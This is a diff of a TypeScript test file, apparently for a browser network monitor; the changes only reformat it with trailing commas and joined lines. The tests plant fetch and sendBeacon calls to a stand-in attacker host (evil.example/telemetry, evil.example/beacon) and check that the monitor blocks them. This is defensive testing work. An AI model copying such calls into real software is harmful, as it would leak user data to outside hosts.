@@ -26,7 +26,7 @@ function stepButton(stepNumber: number, label: string) {
 
 function createTextJob() {
   fireEvent.change(screen.getByLabelText("Paste text"), {
-    target: { value: SYNTHETIC_NOTE }
+    target: { value: SYNTHETIC_NOTE },
   });
   fireEvent.click(screen.getByRole("button", { name: "Create job" }));
 }
@@ -37,11 +37,9 @@ describe("network invariant monitor", () => {
   it("records and blocks a planted fetch attempt (hook self-test)", () => {
     const monitor = install(window);
     try {
-      expect(() => window.fetch("https://evil.example/telemetry")).toThrow(
-        NetworkInvariantError
-      );
+      expect(() => window.fetch("https://evil.example/telemetry")).toThrow(NetworkInvariantError);
       expect(monitor.attempts()).toEqual([
-        { kind: "fetch", url: "https://evil.example/telemetry" }
+        { kind: "fetch", url: "https://evil.example/telemetry" },
       ]);
     } finally {
       monitor.uninstall();
@@ -57,7 +55,7 @@ describe("network invariant monitor", () => {
       expect(window.navigator.sendBeacon("https://evil.example/beacon")).toBe(false);
       expect(monitor.attempts().map((attempt) => attempt.kind)).toEqual([
         "websocket",
-        "sendBeacon"
+        "sendBeacon",
       ]);
     } finally {
       monitor.uninstall();
@@ -87,13 +85,11 @@ describe("network invariant monitor", () => {
       const forwardSteps = [
         [2, "Configure"],
         [3, "Review"],
-        [4, "Privacy Gate"]
+        [4, "Privacy Gate"],
       ] as const;
       for (const [stepNumber, label] of forwardSteps) {
         fireEvent.click(stepButton(stepNumber, label));
-        expect(
-          screen.getByRole("heading", { level: 2, name: label })
-        ).toBeInTheDocument();
+        expect(screen.getByRole("heading", { level: 2, name: label })).toBeInTheDocument();
         expect(monitor.attempts()).toHaveLength(0);
       }
 
